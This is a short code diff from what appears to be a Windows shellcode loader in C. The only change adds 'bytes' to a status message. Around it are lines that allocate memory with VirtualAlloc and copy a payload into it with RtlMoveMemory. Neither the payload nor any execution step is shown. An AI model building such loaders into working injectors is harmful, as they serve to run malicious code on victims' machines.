@@ -15,7 +15,7 @@ int main(void) {
 
 	void* shellcode = VirtualAlloc(PAYLOAD_ADDR, PAYLOAD_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	
-	printf("[+] Shellcode size: %d\n", PAYLOAD_LEN);
+	printf("[+] Shellcode size: %d bytes\n", PAYLOAD_LEN);
 	printf("[+] Memory allocated: 0x%lp\n", shellcode);
 
 	RtlMoveMemory(shellcode, PAYLOAD, PAYLOAD_LEN);
